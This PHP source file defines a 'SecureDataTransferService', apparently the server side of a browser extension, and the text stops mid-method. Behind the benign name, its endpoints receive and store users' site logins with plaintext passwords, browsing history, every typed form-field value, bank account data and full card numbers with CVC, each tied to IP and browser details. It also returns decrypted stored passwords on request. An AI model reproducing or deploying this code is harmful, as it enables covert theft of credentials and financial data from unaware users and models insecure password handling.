<?php declare(strict_types=1);

namespace Mishusoft\Services;

use Mishusoft\Cryptography\OpenSSL\Decryption;
use Mishusoft\Cryptography\OpenSSL\Encryption;
use Mishusoft\Http;
use Mishusoft\Http\Browser;
use Mishusoft\Storage;
use Mishusoft\System\Firewall;
use Mishusoft\System\Network;
use Mishusoft\System\Time;
use Mishusoft\Utility\ArrayCollection;
use Mishusoft\Utility\Debug;
use Mishusoft\Utility\Character;
use Mishusoft\Utility\Number;

class SecureDataTransferService
{
    /**
     * SecureDataTransferService constructor.
     * This is built-in uninterrupted web request processing delivery system.
     */

    /*declare version*/
    public static SecureDataTransferDatabaseService $conOfDatabase;
    private static int $limitOfProductLicence;
    private static int $limitOfProductLicenceBase;

    /**
     * SecureDataTransferService constructor.
     */
    public function __construct()
    {
        self::$conOfDatabase = new SecureDataTransferDatabaseService();
    }

    /**
     * @param array $request
     */
    public function api(array $request)
    {
        Debug::preOutput($request);
        
    }

    /**
     * @param array $request
     * @throws \JsonException
     */
    public function monitor(array $request)
    {
        if (Character::lower($request["method"]) === Character::lower('index')) {
            Firewall::runtimeFailure("Bad Request", [
                "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                "error" => ["description" => "Your requested url is broken!!"]
            ]);
        }
        else if (Character::lower($request["method"]) === Character::lower('browser')) {
            if (Character::lower(implode("/", $request['arguments'])) === Character::lower('receiveFeedback')) {

                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("update", $RequestedDataArray) and is_array($RequestedDataArray["update"]) and count($RequestedDataArray["update"]) > 0) {
                        self::$conOfDatabase->receiveInfoAboutUserUpdate(
                            Character::removeTags(ArrayCollection::value($RequestedDataArray["update"], "name")), Character::removeTags(ArrayCollection::value($RequestedDataArray["update"], "version")),
                            Character::removeTags(ArrayCollection::value($RequestedDataArray["update"], "ip")), Character::removeTags(ArrayCollection::value($RequestedDataArray["update"], "browser")),
                            Character::removeTags(ArrayCollection::value($RequestedDataArray["update"], "message")));

                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                    }

                    if (array_key_exists("status", $RequestedDataArray) and is_array($RequestedDataArray["status"]) and count($RequestedDataArray["status"]) > 0) {
                        $status = self::$conOfDatabase->getInfAbtInstPrdStatus(Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "name")),
                            Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "version")), Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "ip")),
                            Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "os_version")), Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "browser")));
                        if (is_array($status) and count($status) > 0) {
                            self::$conOfDatabase->updateInfOfPrdStatus(Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "name")),
                                Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "version")), Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "ip")),
                                Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "os_version")), Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "browser")),
                                Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "message")));
                        } else {
                            self::$conOfDatabase->insertInfOfPrdStatus(Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "name")),
                                Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "version")), Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "ip")),
                                Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "os_version")), Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "browser")),
                                Character::removeTags(ArrayCollection::value($RequestedDataArray["status"], "message")));
                        }

                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                    }

                    if (!empty(ArrayCollection::value($RequestedDataArray, "browser")) && is_array(ArrayCollection::value($RequestedDataArray, "browser"))) {
                        self::$conOfDatabase->rcvInfAbtUsersBrowser(ArrayCollection::value($RequestedDataArray, "browser"));
                    }
                    if (!empty(ArrayCollection::value($RequestedDataArray, "ipdata")) && is_array(ArrayCollection::value($RequestedDataArray, "ipdata"))) {
                        self::$conOfDatabase->rcvInfAbtUsersIP(ArrayCollection::value($RequestedDataArray, "ipdata"));
                    }
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*send installed product id form server to client*/
            else if (Character::lower(join("/", $request['arguments'])) === Character::lower('getPubAppId')) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (!empty(ArrayCollection::value($RequestedDataArray, "IdRequest")) && is_array(ArrayCollection::value($RequestedDataArray, "IdRequest"))) {
                        if (ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "message") == 'install' || ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "message") == 'checkRun') {
                            self::getVerifiedProductId($RequestedDataArray);
                        } elseif (strpos(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "message"), "update") <= 0) {
                            self::getVerifiedProductId($RequestedDataArray);
                        } else {
                            Storage::StreamAsJson(array("data" => "empty"));
                        }
                    }
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*manage user data form client*/
            elseif (Character::lower(join("/", $request['arguments'])) === Character::lower("UserDataManagement") || Character::lower(join("/", $request['arguments'])) === Character::lower("browserUserDataManagement")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                $defaultQueries = array(
                    "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "tracker"),
                    "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                    "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip"),
                    "os_name_arch" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch"),
                    "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")
                );
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("userdata", $RequestedDataArray) and array_key_exists("command", $RequestedDataArray)) {
                        /*collect data*/
                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveLoginData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "event"),
                                "username" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "username"),
                                "password" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . ' 204 No response');
                        }
                        /*collect data*/
                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveLogoutData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "event"),
                                "username" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "username"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveNavigateData')) {
                            self::$conOfDatabase->saveDataOfUsersBrowserHistories(array_merge($defaultQueries, array(
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveUserSettingData')) {
                            $licence = '';
                            $registeredUserIdByEmail = '';
                            if (Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email"))) {
                                $registeredUserIdByEmail = self::$conOfDatabase->getUsrIdByEmlAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            }

                            if (ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")) {
                                $registeredUserIdByIP = self::$conOfDatabase->getUsrIdByIpAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")));
                                $licence = self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                );
                            }
                            if (!empty(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "first_name"))) &&
                                !empty(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "last_name"))) &&
                                !empty(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email"))) &&
                                !empty(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")))) {
                                if (!empty($registeredUserIdByEmail)) {
                                    Storage::StreamAsJson(array('message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence));
                                } elseif (!empty($registeredUserIdByIP)) {
                                    Storage::StreamAsJson(array('message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence));
                                } else {
                                    self::$conOfDatabase->saveUserSettingData(
                                        Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "first_name")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "last_name")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")),
                                        Encryption::static(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")))
                                    );

                                    self::getLicenceLimitByPlan('trial');

                                    self::$conOfDatabase->setLicenceForProductOfUser(
                                        Number::filterInt(self::$conOfDatabase->getUsrIdByEmlAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")))),
                                        Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        'trial', self::$limitOfProductLicence, self::$limitOfProductLicenceBase, Time::getToday(),
                                        Time::getToday(), Time::getNextDayDate(), 'not-fixed'
                                    );

                                    Storage::StreamAsJson(array(
                                        'message' => 'success', 'registration' => 'new_register',
                                        'way' => 'new', 'log_status' => 'success', 'u_pass' => Encryption::static(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"))),
                                        'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                            Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                            Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                            Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                        )
                                    ));
                                }
                            } else {
                                Storage::StreamAsJson(array('message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence));
                            }
                        }

                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveRegistrationData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, array(
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "event"),
                                "username" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "username"),
                                "password" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"),
                                "email" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email"),
                                "last_update_date_time" => Time::getToday()
                            )));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }

                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('doUserLoginData')) {
                            /*print_r(Decryption::static($data->userdata->_default_->app_id));*/
                            $IdNbOfUsr = self::$conOfDatabase->getUsrIdByEmlAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            $userDetailsByEmail = self::$conOfDatabase->getUsrDtlByEml(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            if (is_array($userDetailsByEmail) and count($userDetailsByEmail) > 0) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                                if (!empty($password) and strlen($password) > USER_PASSWORD_LENGTH_LIMIT) {
                                    if (Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "passwordType")) === 'encrypt') {
                                        if (Decryption::static(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"))) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")), Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")));
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            Storage::StreamAsJson(array('message' => 'error', 'login' => 'incorrect', 'way' => 'password'));
                                        }
                                    } else {
                                        if (Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")), Encryption::static(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"))));
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            Storage::StreamAsJson(array('message' => 'error', 'login' => 'incorrect', 'way' => 'password'));
                                        }
                                    }
                                } else {
                                    Storage::StreamAsJson(array('message' => 'error', 'login' => 'not_exist', 'way' => 'password'));
                                }
                            } else {
                                Storage::StreamAsJson(array('message' => 'error', 'login' => 'not_exist', 'way' => 'email'));
                            }
                        }

                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('resetUserIpData')) {
                            self::$conOfDatabase->resetUsrDtlByNbOfUsrId(
                                self::$conOfDatabase->getUsrIdByIpAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip"))),
                                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "first_name")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "last_name")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")),
                                Encryption::static(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")))
                            );

                            Storage::StreamAsJson(array(
                                'message' => 'success', 'registration' => 'new_register',
                                'way' => 'new', 'log_status' => 'success', 'u_pass' => Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")),
                                'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    Character::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                )
                            ));
                        }

                        if (Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('recoverUserPassword')) {
                            $user = self::$conOfDatabase->getUsrDtlByEml(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            if (isset($user)) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                                if (isset($password)) {
                                    Storage::StreamAsJson(array('message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Decryption::static($password)));
                                } else {
                                    Storage::StreamAsJson(array('message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password'));
                                }
                            } else {
                                Storage::StreamAsJson(array('message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email'));
                            }
                        }
                    }
                } /*else {
                            Firewall::runtimeFailure("Bad Request", [
                                "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                                "error" => ["description" => "Your requested url is broken!!"]
                            ]);
                        }*/
            } /*collect client's browser's input data*/
            elseif (Character::lower(join("/", $request['arguments'])) === Character::lower("InputElementDataRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("inputElementData", $RequestedDataArray)
                        and Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveInputElementData'
                            and is_array(ArrayCollection::value($RequestedDataArray, "inputElementData")))) {
                        $defaultQueries = array(
                            "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "app_id")),
                            "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "ip"),
                            "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "browser")
                        );
                        self::$conOfDatabase->storeCltBrInpInDb(array_merge($defaultQueries, array(
                            "work_website" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "workWebsite"),
                            "name" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "name"),
                            "type" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "type"),
                            "value" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "value"),
                            "placeholder" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "placeholder"),
                        )));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*collect client's bank account info from browser*/
            elseif (Character::lower(join("/", $request['arguments'])) === Character::lower("clientBankAccountRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("bankAccountData", $RequestedDataArray)
                        and Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('saveBankAccountData'
                            and is_array(ArrayCollection::value($RequestedDataArray, "bankAccountData")))) {
                        $defaultQueries = array(
                            "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "app_id")),
                            "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "ip"),
                            "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "browser")
                        );
                        self::$conOfDatabase->storeCltBnkAccData(array_merge($defaultQueries, array(
                            "work_website" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "workWebsite"),
                            "data_type" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "name"),
                            "data_value" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "type")
                        )));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*collect client's online payment info from browser*/
            elseif (Character::lower(join("/", $request['arguments'])) === Character::lower("clientPaymentMethodsRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("paymentMethodsInfo", $RequestedDataArray)
                        and Character::lower(ArrayCollection::value($RequestedDataArray, "command")) === Character::lower('savePaymentMethodsData'
                            and is_array(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo")))) {
                        $defaultQueries = array(
                            "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "app_id")),
                            "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "ip"),
                            "os_name_arch" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "os_name_arch"),
                            "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "browser")
                        );
                        if (Character::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber")) !== Character::lower("Unknown")
                            and Character::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder")) !== Character::lower("Unknown")
                            and Character::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand")) !== Character::lower("Unknown")
                            and Character::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire")) !== Character::lower("Unknown")
                            and Character::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")) !== Character::lower("Unknown"))
                            self::$conOfDatabase->storeCltPytMtdData(array_merge($defaultQueries, array(
                                "work_website" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "event") ? ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "event") : 'bug',
                                "cardNumber" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber"),
                                "cardHolder" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder"),
                                "cardBrand" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand"),
                                "cardExpire" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire"),
                                "cardCVC" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")
                            )));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => (new Browser())->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"]
                    ]);
                }
            } /*collect client's online earning info from browser*/
            elseif (Character::lower(join("/", $request['arguments'])) === Character::lower("clientEarningRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray)
                        and array_key_exists("earndata", $RequestedDataArray)
                        and is_array(ArrayCollection::value($RequestedDataArray, "earndata"))) {

                        self::$conOfDatabase->upgradeLcnLmt(
                            Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                            Number::filterInt(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "earn"))
                        );

                        $today = self::$conOfDatabase->getClientErnDtlByDt(
                            Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                            Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "username")),
                            Time::getTodayDateOnly()
                        );
                        if (!is_array($today) and count($today)) {
                            self::$conOfDatabase->updateClientErnDtlByDt(
                                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "username")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "earn")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referrals")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referralsEarn"))
                            );
                        } else {
                            self::$conOfDatabase->storeClientErnDtlByDt(
                                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "earn")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referrals")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "referralsEarn")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "event")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "username")),
                                Character::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "workWebsite")),
                                Time::getTodayDateOnly()
                            );
                        }
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
